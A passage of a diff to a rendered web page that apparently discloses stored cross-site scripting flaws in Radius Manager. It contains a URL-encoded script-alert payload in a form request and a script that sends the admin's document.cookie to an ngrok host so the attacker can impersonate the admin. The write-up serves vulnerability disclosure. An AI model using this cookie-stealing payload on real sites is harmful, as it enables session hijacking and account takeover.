+Cookie: PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
 
 firstname=%3Cscript%3Ealert%28%221d8%22%29%3C%2Fscript%3E&amp;lastname=n&amp;address=n&amp;city=Tampa&amp;zip=9&amp;country=United+States&amp;state=California&amp;phone=56574121&amp;mobile=875412151&amp;email=&amp;company=&amp;taxid=&amp;lang=English&amp;alertemail=1&amp;alertsms=1&amp;Submit=Submit
-</code></pre></div><h2 id="demo-videos">Demo Videos</h2>
+</code></pre>
+<h2 id="demo-videos">Demo Videos</h2>
 <p>By inserting an alert(&ldquo;text&rdquo;); box in the fields listed above, we&rsquo;re able to exploit this vulnerability as seen in the following gifs:</p>
 <ul>
 <li>
@@ -630,12 +639,13 @@ firstname=%3Cscript%3Ealert%28%221d8%22%29%3C%2Fscript%3E&amp;lastname=n&amp;add
 <h3 id="cross-site-scripting-xss">Cross Site Scripting (XSS)</h3>
 <p>We first need to inject our script into an input field so that whenever an admin logs in &amp; lists the available access points, their cookie is sent to us (the attacker in this scenario).</p>
 <p>The script used that will be injected is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span> 
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
-<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://dat.ngrok.io/cookie=&#39;</span> <span style="color:#f92672">+</span> document.<span style="color:#a6e22e">cookie</span>; 
-<span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#a6e22e">url</span>, <span style="color:#66d9ef">false</span>); <span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">send</span>();<span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">xl</span>.<span style="color:#a6e22e">responseText</span>);
-<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
-</code></pre></div><p>where dat is the subdomain generated by ngrok. And we will be injecting it into the description field when adding/editing an access point.</p>
+<pre><code class="language-javascript">&lt;script&gt; 
+var xl = new XMLHttpRequest(); 
+const url = 'http://dat.ngrok.io/cookie=' + document.cookie; 
+xl.open(&quot;GET&quot;, url, false); xl.send();alert(xl.responseText);
+&lt;/script&gt;
+</code></pre>
+<p>where dat is the subdomain generated by ngrok. And we will be injecting it into the description field when adding/editing an access point.</p>
 <p>After listing the available access points as an admin, this is what an attacker would see:</p>
 <p><img src="./imgs/img3.png" alt=""></p>
 <p>As you can see, we have everything we need in order to impersonate the admin user and this was achieved just by having them list the available access points. This of course requires that an attacker already have an account registered on the Radius Manager with sufficient privileges to add/edit an access point.</p>
@@ -692,6 +702,10 @@ firstname=%3Cscript%3Ealert%28%221d8%22%29%3C%2Fscript%3E&amp;lastname=n&amp;add
 <link rel="stylesheet" href="/css/search.fe0cd54a21628574bff49d721c827d1bb165ab56b0f22dd55ae78addbe61c309.css"></link>
 
 
+
+  <script src="/js/custom_01.js"></script>
+
+  <script src="/js/custom_02.js"></script>
 
 
     
